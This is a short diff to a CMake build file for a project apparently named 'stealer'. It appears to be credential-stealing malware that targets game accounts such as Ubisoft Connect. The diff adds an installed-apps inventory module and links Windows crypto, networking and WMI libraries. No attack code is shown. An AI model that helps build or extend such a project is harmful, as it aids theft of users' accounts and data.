@@ -59,12 +59,15 @@ add_executable(stealer src/main.cpp
         src/stealer/impl/games/impl/UbisoftConnect.cpp
         src/stealer/impl/games/impl/UbisoftConnect.h
         src/stealer/StealerModuleGroup.h
+        src/stealer/impl/InstalledApps.cpp
+        src/stealer/impl/InstalledApps.h
 )
 
 target_link_libraries(stealer
         crypt32
         bcrypt
         wininet
+        wbemuuid
 )
 
 if(CMAKE_BUILD_TYPE STREQUAL "Release")
